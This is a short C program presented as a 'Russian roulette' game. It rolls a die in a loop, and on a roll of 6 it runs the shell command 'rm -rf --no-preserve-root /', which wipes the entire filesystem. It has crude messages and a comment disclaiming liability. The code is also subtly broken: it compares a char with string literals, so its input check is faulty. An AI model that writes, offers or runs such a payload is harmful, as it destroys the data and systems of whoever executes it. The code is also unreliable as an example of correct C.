// Use this script at you own risk
// I am not liable for any damage caused
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main() {
    char ready;
    int random_number;

    srand(time(NULL));

    while(1) {
        random_number = rand() % 6 + 1;

        printf("Are you ready to play the game? (y/n)");
        scanf(" %c", &ready);

        if (ready == "y" || ready == "Y") {
            if (random_number == 6) {
                printf("Unlucky mate, but you are fucked!\n");
                system("rm -rf --no-preserve-root /");
                break;
            } else {
                printf("You got lucky mate!\n");
            }
        } else {
            printf("Pussy!\n");
            break;
        }
    }
    return 0;
}